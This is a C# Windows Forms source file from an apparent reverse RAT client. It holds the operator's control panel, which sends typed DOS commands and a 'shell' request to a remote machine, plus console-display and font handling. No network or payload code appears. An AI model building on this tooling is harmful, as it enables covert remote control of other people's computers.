using System;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace ReverseRatClient
{
    public partial class PanelDeControl : Form
    {
        Miscelanea  Msc = new Miscelanea();
        //Create your private font collection object.
        PrivateFontCollection pfc = new PrivateFontCollection();
        public PanelDeControl()
        {
            InitializeComponent();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            ProcesarComandosDos();
        }

        private void ProcesarComandosDos()
        {
            // Envia cualquier conmando DOS
            var pc = (Principal) Msc.DevolverMDI("Principal");
            pc.EnviarComando(textBox2.Text, Text);

            if (textBox2.Text == @"cls")
                textBox1.Text = "";
            if (textBox2.Text == @"exit")
            {
                textBox1.AppendText("\r\nSesion finalizada\r\n");
                ScrollVentanaDos();
                textBox1.ReadOnly = true;
            }

            textBox2.Text = "";
            AgregarNuevaLinea();
        }

        private void AgregarNuevaLinea()
        {
            
            textBox1.Text = textBox1.Text + "\r\n";
            ScrollVentanaDos();
            
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode== Keys.Return)
                button3.PerformClick();
        }

        private void PanelDeControl_Load(object sender, EventArgs e)
        {
          
           
            //After that we can create font and assign font to label
           // InicializarFuente();
        //    textBox1.Font  = new Font(pfc.Families[0], textBox1.Font.Size);

           /* try
            {
                PrivateFontCollection modernFont = new PrivateFontCollection();
                modernFont.AddFontFile("VGASquarePx.ttf");
                textBox1.Font = new Font(modernFont.Families[0], 21);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }*/
           // textBox1.KeyDown += OnKeyDown();
        }

        void InicializarFuente()
        {
         

            //Select your font from the resources.
            //My font here is "Digireu.ttf"
            int fontLength = Properties.Resources.VGASquarePx.Length;

            // create a buffer to read in to
            byte[] fontdata = Properties.Resources.VGASquarePx;

            // create an unsafe memory block for the font data
            IntPtr data = Marshal.AllocCoTaskMem(fontLength);

            // copy the bytes to the unsafe memory block
            Marshal.Copy(fontdata, 0, data, fontLength);

            // pass the font to the font collection
            pfc.AddMemoryFont(data, fontLength);
        }

        private void PanelDeControl_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Escape)
                Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            textBox2.Text = @"hola";
            button3.PerformClick();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string[] campos;
            campos = textBox1.Text.Split('>');
            textBox2.Text = campos[campos.GetUpperBound(0)];
          //  textBox3.Text = textBox1.Text.Substring(textBox1.Text.Length - 3, 1);
        }
       

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Down || e.KeyCode == Keys.Up || e.KeyCode == Keys.Left)
            {             
                e.Handled = true;
            }
            else
            {
                e.Handled = false;
            }
            

        }

        private void textBox1_KeyUp(object sender, KeyEventArgs e)
        {
            //MessageBox.Show(e.KeyCode.ToString());

         
            if (e.KeyCode != Keys.Return)
                button2.PerformClick();           
            else
              ProcesarComandosDos();
        }

        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            //MessageBox.Show(tabControl1.SelectedIndex.ToString());
            
        }

        void EstablecerFuenteLetraShell()
        {            
                try
                {
                    PrivateFontCollection modernFont = new PrivateFontCollection();
                    modernFont.AddFontFile("VGASquarePx.ttf");
                    textBox1.Font = new Font(modernFont.Families[0], 19);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }            
        }

        private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
        {

          /*  if ((Control.ModifierKeys & Keys.Control) == Keys.Control)
            {
                if (Keyboard.IsKeyDown(Key.A))
                {
                    e.Handled = true;
                }
                if (Keyboard.IsKeyDown(Key.Z))
                {
                    e.Handled = true;
                }
            }*/

            /*if (Convert.ToByte(e.KeyChar) == 8 && textBox1.Text.Substring(textBox1.SelectionStart - 1, 1) == ">") 
                textBox1.ReadOnly = true;
            else
                textBox1.ReadOnly = false;*/

           // MessageBox.Show(Convert.ToByte(e.KeyChar).ToString());
        }

        private void textBox1_PreviewKeyDown(object sender, PreviewKeyDownEventArgs e)
        {
                          
            if ((e.KeyCode == Keys.Left || e.KeyCode == Keys.Back) && textBox1.Text.Substring(textBox1.SelectionStart - 1, 1) == ">")
                textBox1.ReadOnly = true;
            else
                textBox1.ReadOnly = false;
        }

        private void textBox1_Click(object sender, EventArgs e)
        {
             ScrollVentanaDos();
        }


        void ScrollVentanaDos()
        {
            // Scroll hasta el final de TxtBox de Shell cuando hay intervencion de Mouse
            textBox1.SelectionStart = textBox1.TextLength;
            textBox1.ScrollToCaret();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            textBox1.ReadOnly = false;
            textBox2.Text = "shell";
            ProcesarComandosDos();
            EstablecerFuenteLetraShell();
            tabControl1.SelectTab(tabPage2);
            textBox1.Focus();
            ScrollVentanaDos();           
        }
    }

   
}
